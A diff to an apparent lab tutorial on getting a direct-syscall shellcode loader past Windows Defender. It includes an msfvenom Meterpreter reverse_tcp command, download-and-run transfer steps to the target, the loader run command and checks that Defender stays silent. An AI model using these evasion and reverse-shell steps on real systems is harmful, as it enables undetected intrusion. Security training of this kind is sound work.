@@ -9,7 +9,7 @@ You finished Documents 05 and 06. You have built two loaders and Defender caught
 
 You understand that Defender has multiple detection layers, and XOR encryption only defeats one of them (static file scanning). The loader binary's import table and runtime behavior are still being caught.
 
-Your lab is running with Windows 11 (Defender on, default settings) at 192.168.10.100 and Kali at 192.168.10.200.
+Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling, target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.
 
 ## Why This Is Next
 
@@ -149,27 +149,34 @@ At runtime, the program resolves NT function addresses, builds function names fr
 
 ## Getting the Loader Onto the Target
 
-You need two files on your Windows 11 machine:
+The three-machine workflow:
+
+1. **Kali (192.168.10.200):** Generate raw shellcode (if you do not already have encrypted.bin from Document 06).
+2. **Dev box (ammulu, 192.168.10.150):** Download shellcode from Kali if needed, run the XOR encoder from Document 06 to create encrypted.bin, compile Loader 03. Host syscall_loader.exe and encrypted.bin on a Python HTTP server.
+3. **Target (kimjongun, 192.168.10.100):** Download both files from the dev box. Run the loader.
+
+You need two files on the target:
 
 1. **syscall_loader.exe** - the compiled Loader 03 binary
 2. **encrypted.bin** - the XOR-encrypted shellcode from Document 06
 
-You already generated encrypted.bin in Document 06 using the encoder. If you still have it on your Windows VM, reuse it. If not, regenerate it by running xor_encode.exe on fresh msfvenom shellcode.
+You already generated encrypted.bin in Document 06 using the encoder. If you still have it on your dev box, reuse it. If not, regenerate it by running xor_encode.exe on fresh msfvenom shellcode on the dev box.
 
-**Transfer method:** Python HTTP server on Kali.
+**Transfer method:** Host files on the dev box's Python HTTP server and download from the target.
 
-On Kali:
-```bash
-cd /path/to/your/files
-python3 -m http.server 8080
+On the dev box (ammulu):
+```
+cd C:\Users\ammulu\Desktop
+python -m http.server 8080
 ```
 
-On Windows (PowerShell):
+On the target (kimjongun), PowerShell:
 ```powershell
-Invoke-WebRequest -Uri "http://192.168.10.200:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
 ```
 
-Defender scans syscall_loader.exe when it is written to disk. Because the import table only shows GetModuleHandle and GetProcAddress, the binary does not match the "shellcode injection tool" heuristic pattern. Defender allows the file to stay on disk.
+Defender on the target scans syscall_loader.exe when it is written to disk. Because the import table only shows GetModuleHandle and GetProcAddress, the binary does not match the "shellcode injection tool" heuristic pattern. Defender allows the file to stay on disk.
 
 The encrypted.bin file, as you confirmed in Document 06, also survives disk scanning because XOR encryption scrambles the byte signatures.
 
@@ -450,13 +457,13 @@ The full source code is at `lab/loaders/03_direct_syscalls_loader.cs`.
 
 ### Step 1: Generate and Encrypt Shellcode
 
-If you already have encrypted.bin from Document 06, skip to Step 2. Otherwise, on Kali:
+If you already have encrypted.bin from Document 06 on the dev box, skip to Step 2. Otherwise, on Kali:
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f raw -o payload.bin
 ```
 
-Transfer payload.bin to your Windows VM and run the encoder from Document 06:
+Transfer payload.bin from Kali to the dev box (ammulu) using `python3 -m http.server 8080` on Kali and `Invoke-WebRequest` on the dev box. Then run the encoder from Document 06 on the dev box:
 
 ```
 xor_encode.exe payload.bin encrypted.bin
@@ -466,7 +473,7 @@ Save the printed XOR key.
 
 ### Step 2: Compile Loader 03
 
-On your Windows 11 VM, open the Developer Command Prompt for Visual Studio 2022:
+On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022:
 
 ```
 csc /unsafe /out:syscall_loader.exe 03_direct_syscalls_loader.cs
@@ -474,9 +481,21 @@ csc /unsafe /out:syscall_loader.exe 03_direct_syscalls_loader.cs
 
 The `/unsafe` flag is needed because Marshal.Copy and Marshal.GetDelegateForFunctionPointer work with unmanaged memory pointers. Expected output: the compiler produces syscall_loader.exe with no errors.
 
-### Step 3: Transfer the Files
+### Step 3: Transfer the Files to the Target
 
-If you compiled on the Windows VM, the files are already there. If you compiled elsewhere, transfer syscall_loader.exe and encrypted.bin using the Python HTTP server method from Document 06.
+On the dev box (ammulu), host both files on a Python HTTP server:
+
+```
+cd C:\Users\ammulu\Desktop
+python -m http.server 8080
+```
+
+On the target (kimjongun, 192.168.10.100), download both:
+
+```powershell
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
+```
 
 ### Step 4: Set Up Your Listener on Kali
 
@@ -491,7 +510,7 @@ run
 
 ### Step 5: Run the Loader
 
-On your Windows 11 VM:
+On the target (kimjongun, 192.168.10.100):
 
 ```
 syscall_loader.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
@@ -537,7 +556,7 @@ Three things confirm that Loader 03 worked:
 
 1. **Meterpreter session opened.** Your Kali listener shows a session. You can run `sysinfo`, `getuid`, `pwd`, and other Meterpreter commands. The shellcode is running inside the loader process on the Windows 11 machine.
 
-2. **No Defender alerts.** Open Windows Security on the Windows VM. Go to Virus & threat protection, then Protection history. There should be no new entries for syscall_loader.exe. Defender did not catch the loader.
+2. **No Defender alerts.** Open Windows Security on the target (kimjongun). Go to Virus & threat protection, then Protection history. There should be no new entries for syscall_loader.exe. Defender did not catch the loader.
 
 3. **The loader process is running.** Open Task Manager on Windows. Look for syscall_loader.exe (or whatever you named the binary). It shows as a normal process. Defender is not flagging it.
 
